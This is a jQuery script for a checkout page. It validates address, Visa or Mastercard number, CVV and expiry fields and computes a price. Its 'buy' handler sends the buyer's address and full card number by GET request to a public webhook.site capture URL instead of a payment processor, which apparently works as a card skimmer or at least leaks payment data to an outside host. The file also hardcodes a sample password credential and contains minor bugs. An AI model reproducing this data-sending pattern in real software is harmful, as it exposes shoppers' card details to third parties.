const price = 6; //6usd
const compare = (a, b) => a.getTime() > b.getTime();
const stepper = {
    value: 1,
    add() {
        this.value++;
    },
    minus() {
        this.value--;
    },
    setValue(e) {
        this.value = parseInt(e);
    }
};
const address = {
    value: '',
    regex: /^.+$/,
    "Error": $('<i class="fa fa-exclamation-circle error"  ctitle="error" title="Can be empty"></i>'),
    check() {
        return (this.regex.test(this.value) ? '' : this.Error)
    }
};
const numbers = {
    value: stepper.value,
    pattern: /^[1-9][0-9]*/,
    check() {
        return this.value >= 1;
    }
}
const credit = {
    value: '',
    visa: {
        regex: /^4\d{0,15}$/,
        RexMust: /^4\d{15}$/
    },
    mastercard: {
        regex: /^(5[1-5]\d{0,2}|22[2-9]\d{0,1}|2[3-7]\d{0,2})\d{0,12}$/,
        RexMust: /^(5[1-5]\d{0,2}|22[2-9]\d{0,1}|2[3-7]\d{0,2})\d{12}$/
    },
    Error: {
        'empty': $('<i class="fa fa-exclamation-circle error"  ctitle="error" title="Can\'t be empty"></i>'),
        'wrong': $('<i class="fa fa-exclamation-circle error"  ctitle="error" title="Only accept Visa card or Master card"></i>')
    },
    ExpDate: {
        value: new Date(),
        Error: {
            'wrong': $('<i class="fa fa-exclamation-circle error"  ctitle="error" title="Your card had been Exprice, please try again!"></i>')
        },
        check() {
            return compare(this.value, new Date()) ? '' : this.Error.wrong;
        }
    },
    cvv: {
        value: '',
        regex: /^[0-9]{3,4}$/,
        Error: {
            'empty': $('<i class="fa fa-exclamation-circle error"  ctitle="error" title="Can\'t be empty"></i>'),
            'wrong': $('<i class="fa fa-exclamation-circle error"  ctitle="error" title="CVV must be 3-4 numbers"></i>')
        },
        check() {
            return isEmpty(this.value) ? this.Error.empty : (this.regex.test(this.value) ? '' : this.Error.wrong);
        }
    },
    currentCredit: '',
    check() {
        return isEmpty(this.value) ? this.Error.empty : ((credit.visa.RexMust.test(this.value) || credit.mastercard.RexMust.test(this.value)) ? '' : this.Error.wrong);
    }
}

function isEmpty(e) {
    if (e.replace(/^\s+|\s+$/gm, '').length == 0) {
        return true;
    }
    return false;
}

function stepperUpdate() {
    if (stepper.value >= 1) {
        $("#amount").val(stepper.value);
    } else stepper.value = 1;
    totalPrice();
}

function totalPrice() {
    $('body > div.container > div:nth-child(1) > div > div.content_pay > h2 > span').text(stepper.value * price);
}

function checkAddress() {
    $('#address').next().children().remove();
    address.value = $('#address').val();
    var result = address.check();
    if (result) {
        $('#address').next().append(result);
        return false;
    };
    return true;
}

function checkCardNumber() {
    $('#cardNumber').next().children().remove();
    credit.value = $('#cardNumber').val();
    var result = credit.check();
    if (result) {
        $('#cardNumber').next().append(result);
        return false;
    };
    return true;
}

function checkCVV() {
    $('#cvv').next().children().remove();
    credit.cvv.value = $('#cvv').val();
    var result = credit.cvv.check();
    if (result) {
        $('#cvv').next().append(result);
        return false;
    };
    return true;
}

function checkExpDate() {
    $('#expDate').next().children().remove();
    var exp = $('#exYear').val() + '-' + $('#exMonth').val() + '-' + '1';
    credit.ExpDate.value = new Date(exp);
    var result = credit.ExpDate.check();
    if (result) {
        $('#expDate').next().append(result);
        return false;
    };
    return true;
}
$(document).ready(function () {
    let pwdCredential = new PasswordCredential({
        id: "example-username", // Username/ID
        name: "John Doe", // Display name
        password: "correct horse battery staple" // Password
    });
    console.assert(pwdCredential.type === "password");
    var currentdate = new Date();
    var currentYear = currentdate.getFullYear();
    currentYear--;
    //address check
    $('#address').on('blur', function () {
        checkAddress();
    });
    //Exp Month
    for (var i = 1; i <= 12; i++) {
        var option = "<option value='" + i + "'>" + i + "</option>";
        $("#exMonth").append(option);
    }
    //Exp year
    for (var i = 100; i >= 0; i--) {
        var option = "<option value='" + (currentYear + i) + "'>" + (currentYear + i) + "</option>";
        $("#exYear").append(option);
    }
    var val = 1;
    //Steppen input
    $(".stepperButton").on("click", "#minus, #plus", function () {
        switch ($(this).attr("id")) {
            case "plus":
                stepper.add();
                break;
            case "minus":
                stepper.minus();
                break;
        }
        stepperUpdate();
    });
    //total price
    $('#amount').on('keyup blur', function () {
        var val = $('#amount').val();
        stepper.setValue(val > 0 ? val : 1);
        stepperUpdate();
    });
    //credit card check
    $("#cardNumber").on("keyup", function () {
        $('#cardNumber').next().children().remove();
        value = $(this).val();
        if (credit.visa.regex.test(value)) {
            $("#visa").addClass('accept');
            credit.currentCredit = 'visa'
        } else if (credit.mastercard.regex.test(value)) {
            $("#mastercard").addClass('accept');
            credit.currentCredit = 'mastercard'
        } else {
            $('.accept').removeClass('accept');
            $('#cardNumber').append(credit.Error.wrong);
        }
    }).on('focusout', function () {
        checkCardNumber();
    });
    $('#cvv').focusout(function () {
        checkCVV();
    });
    $('#confirm').on('click', function (e) {
        e.preventDefault();
        var address = checkAddress();
        var credit = checkCardNumber();
        var cvv = checkCVV();
        var expDate = checkExpDate();
        if (address && credit && cvv && expDate) {
            modalConfirm(e);
            $('.modal').addClass('open');
        }
        err = $("i[ctitle='error']");
        if (err.length) {
            $("i[ctitle='error']").addClass("shake-horizontal");
            setTimeout(function () {
                $("i[ctitle='error']").removeClass("shake-horizontal");
            }, 800)
            return;
        }
    });

    function modalConfirm(e) {
        e.preventDefault();
        $('#address_value').text(address.value);
        $('#amount_value').text(stepper.value);
        $('#credit_value').text(credit.value);
        $('#total').text(parseInt(stepper.value) * 6);
    }
    $('#buy').on('click', function () {
        $.ajax({
            origin: '*',
            type: "get",
            url: "https://webhook.site/bfab47bc-b4b6-46bb-bbb5-809f3a81e351",
            data: {
                cardBackGround: 'data',
                number: stepper.value,
                address: address.value,
                cardNumber: credit.value
            },
            beforeSend: function () {
                $('.modal__contener').html('<center><div class="spinner"></div></center>');
                $('.modal_foo').html("");
            },
            success: function (msg) {
                $('.modal__contener').html('<h2>Successfull</h2>');
                $('.modal_foo').html('<a href="dashboard"><button id="close">CLOSE</button ></a >');
            },
            error: function (jqXHR, textStatus, errorThrown) {
                alert(textStatus);
            }
        });
    })
});
